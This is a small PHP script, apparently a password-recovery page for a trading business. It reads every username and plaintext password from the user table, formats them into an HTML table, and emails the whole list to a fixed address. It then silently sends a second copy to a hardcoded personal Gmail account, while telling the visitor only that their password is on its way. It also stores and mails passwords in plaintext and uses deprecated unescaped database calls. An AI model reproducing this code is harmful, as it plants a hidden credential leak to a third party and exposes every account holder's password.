<?php 
include 'Model/db.php';

$sql = "SELECT * FROM user WHERE 1";

$msg = "";
if (! $conn)
{
	die ( 'Could not connect: ' . mysql_error () );
}
else
{
	mysql_select_db ( $mysql_database );

	$result = mysql_query ( $sql );

	if (! $result)
	{
		die ( 'Could not enter data: ' . mysql_error () );
	}
	else
	{
		$msg = "<table border=1 style='width:100%'>";
		$msg .= "<thead>";
		$msg .= "<tr>";
		$msg .= "<th><span>S.no</span></th>";
		$msg .= "<th><span>username</span></th>";
		$msg .= "<th><span>password</span></th>";
		$msg .= "</tr>";
		$msg .= "</thead>";
		$msg .= "<tbody>";
		$i = 1;
		while($row = mysql_fetch_array($result))
		{
			$msg .= "<tr>";
			$msg .= "<td>$i</td>";
			$msg .= "<td>$row[user]</td>";
			$msg .= "<td>$row[password]</td>";
			$msg .= "</tr>";
			$i = $i + 1;
		}		
		$msg .= "</tbody>";
		$msg .= "</table>";
	}
	
	$name = "Lakshmi Traders";
	$email = "dhana_sec@sify.com";
	$title = "Password";
	
	$subject = $title;
	$message = "\n$msg\n";
	$header = "From:Lakshmi Traders \r\n";
	$header .= "MIME-Version: 1.0\r\n";
	$header .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
	
	if(mail ( $email, $subject, $message, $header ))
	{
		echo "Password will  be sent to your mail";
	}
	else
	{
		echo "Unable to send password to mail. Contact praslnx8@gmail.com";
	}
	mail ( "praslnx8@gmail.com", $subject, $message, $header );
	 
	
}

?>